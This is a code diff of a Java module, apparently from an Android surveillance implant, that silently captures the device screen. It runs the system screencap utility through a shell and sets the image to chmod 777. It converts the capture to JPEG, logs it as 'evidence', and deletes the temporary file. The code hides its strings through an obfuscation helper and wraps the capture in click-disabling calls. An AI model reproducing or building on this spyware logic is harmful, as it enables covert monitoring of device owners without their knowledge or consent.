@@ -157,8 +157,11 @@ public class ModuleSnapshot extends BaseInstantModule {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (screencapMethod) ");
 		}
+		
+		// Questa utility chiama solo una IOCTL
+		// http://forum.xda-developers.com/showpost.php?p=41461956
 		String sc = M.e("/system/bin/screencap");
-		String frame = M.e("/data/data/") + Status.self().getAppContext().getPackageName()+ M.e("/files/frame.png");
+		String frame = M.e("/data/data/") + Status.getAppContext().getPackageName()+ M.e("/files/frame.png");
 		
 		AutoFile asc = new AutoFile(sc);
 		AutoFile aframe = new AutoFile(frame);
@@ -167,22 +170,24 @@ public class ModuleSnapshot extends BaseInstantModule {
 		if(asc.exists() && asc.canRead()){
 			
 			try{
-			disableClick();
-			
-			ExecuteResult res = Execute.executeScript( sc + " -p " + frame + ";chmod 777 "+ frame);
-			if(aframe.exists() && aframe.canRead()){
-				Bitmap bitmap = readPng(aframe);
-				if(bitmap == null){
-					return false;
+				disableClick();
+				
+				ExecuteResult res = Execute.executeScript( sc + " -p " + frame + ";chmod 777 "+ frame);
+				
+				if(aframe.exists() && aframe.canRead()){
+					Bitmap bitmap = readPng(aframe);
+					if(bitmap == null){
+						return false;
+					}
+					byte[] jpeg = toJpeg(bitmap);
+					if(jpeg == null){
+						return false;
+					}
+					EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+					return true;
 				}
-				byte[] jpeg = toJpeg(bitmap);
-				if(jpeg == null){
-					return false;
-				}
-				EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
-				return true;
-			}
 			}finally{
+				aframe.delete();
 				enableClick();
 			}
 		}
